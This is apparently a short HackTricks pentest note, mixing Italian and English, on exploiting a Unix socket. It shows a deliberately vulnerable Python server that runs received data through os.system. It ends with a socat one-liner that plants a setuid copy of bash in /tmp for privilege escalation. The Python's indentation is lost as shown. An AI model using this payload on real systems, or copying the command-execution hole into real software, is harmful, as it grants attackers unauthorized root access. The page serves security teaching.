{{#include ../../banners/hacktricks-training.md}}

## Esempio di binding socket con Python

In the following example a **unix socket is created** (`/tmp/socket_test.s`) and everything **received** is going to be **executed** by `os.system`. So che non troverai questo nella natura, ma l'obiettivo di questo esempio è vedere come appare un codice che utilizza socket unix e come gestire l'input nel peggior caso possibile.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Esegui** il codice usando python: `python s.py` e **controlla come il socket sta ascoltando**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Sfruttare**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
{{#include ../../banners/hacktricks-training.md}}
